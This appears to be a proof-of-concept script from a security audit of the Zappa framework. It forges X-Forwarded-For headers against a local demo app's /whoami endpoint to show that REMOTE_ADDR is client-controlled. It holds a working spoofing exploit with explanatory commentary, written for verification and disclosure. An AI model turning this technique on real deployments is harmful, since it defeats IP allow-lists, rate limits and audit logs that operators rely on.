#!/usr/bin/env python3
"""VULN-005 — X-Forwarded-For `addresses[-2]` heuristic → spoofable REMOTE_ADDR.

Vulnerable code : targets/Zappa/zappa/wsgi.py:58-65 (also asgi.py:47-52)
Vulnerability   : CWE-348 Use of Less Trusted Source / CWE-290 Authentication
                  Bypass by Spoofing.
Surface         : A (HTTP request path — internet-facing, unauthenticated).

Mechanism (plain English)
-------------------------
`create_wsgi_request` derives the WSGI `REMOTE_ADDR` from the client-supplied
`X-Forwarded-For` header like this:

    x_forwarded_for = headers.get("X-Forwarded-For", "")
    if "," in x_forwarded_for:
        addresses = [addr.strip() for addr in x_forwarded_for.split(",")]
        remote_addr = addresses[-2]          # "second to last is the real client ip"
    else:
        remote_addr = x_forwarded_for or "127.0.0.1"

The heuristic assumes a fixed CloudFront-in-front topology where the *last* hop
is CloudFront and the second-to-last is the genuine client. But `X-Forwarded-For`
is entirely attacker-controlled: the client simply appends its own list. So an
attacker picks whatever value lands in `addresses[-2]` (or, with no comma, the
whole header) and Zappa hands that string to the app as the trusted client IP.

Exploitation idea
-----------------
Send `X-Forwarded-For: <ATTACKER_IP>, <any-trailer>`; then `addresses[-2]` is
`<ATTACKER_IP>`. The app (and anything built on `request.remote_addr` —
IP allow-lists, rate-limits, audit logs, geo/fraud checks) trusts a value the
client fabricated.

What a successful run proves
----------------------------
Hitting the demo app's /whoami with a forged XFF makes Zappa report an
arbitrary attacker-chosen `remote_addr`, defeating any IP-based control.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, build_request, log, raw_request, split_response, verdict

VULN = "VULN-005"


def whoami(xff):
    """GET /whoami with a chosen X-Forwarded-For; return the parsed JSON the app sees."""
    req = build_request("GET", "/whoami", {"X-Forwarded-For": xff} if xff is not None else {})
    raw = raw_request(req)
    _status, _hdrs, body = split_response(raw)
    return json.loads(body.decode("utf-8"))


def main():
    banner(VULN, "X-Forwarded-For addresses[-2] -> spoofable REMOTE_ADDR",
           "zappa/wsgi.py:58-65 create_wsgi_request (XFF -> REMOTE_ADDR)")

    spoof_ip = "13.37.13.37"  # attacker-chosen "client IP"

    # Case 1: multi-value XFF. Per wsgi.py, remote_addr = addresses[-2].
    # We put our forged IP in the second-to-last position and a junk trailer last.
    log("STEP", f"sending X-Forwarded-For: '{spoof_ip}, 203.0.113.9' (forged IP in addresses[-2])")
    seen = whoami(f"{spoof_ip}, 203.0.113.9")
    log("INFO", f"app observed remote_addr = {seen['remote_addr']!r} (x_forwarded_for={seen['x_forwarded_for']!r})")

    # Case 2: single value (no comma) — the whole header becomes remote_addr.
    other_ip = "192.0.2.66"
    log("STEP", f"sending single-value X-Forwarded-For: '{other_ip}' (no comma -> whole header trusted)")
    seen2 = whoami(other_ip)
    log("INFO", f"app observed remote_addr = {seen2['remote_addr']!r}")

    # Baseline: with no XFF the code falls back to 127.0.0.1 (proves the header is the source).
    seen0 = whoami(None)
    log("INFO", f"baseline (no XFF) remote_addr = {seen0['remote_addr']!r}")

    ok = seen["remote_addr"] == spoof_ip and seen2["remote_addr"] == other_ip
    if ok:
        log("PROOF", f"Zappa reported attacker-chosen client IPs {spoof_ip} and {other_ip} verbatim — "
                     f"REMOTE_ADDR is fully client-controlled, so any IP allow-list / rate-limit / audit "
                     f"trail keyed on request.remote_addr is bypassable.")
        log("OK", "exploit confirmed — REMOTE_ADDR spoofed via X-Forwarded-For")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — client fully controls REMOTE_ADDR via X-Forwarded-For")
        return 0
    log("FAIL", f"expected {spoof_ip}/{other_ip}, saw {seen['remote_addr']}/{seen2['remote_addr']}")
    verdict("FAILED", f"{VULN}: FAILED — REMOTE_ADDR did not track the forged header")
    return 1


if __name__ == "__main__":
    sys.exit(main())
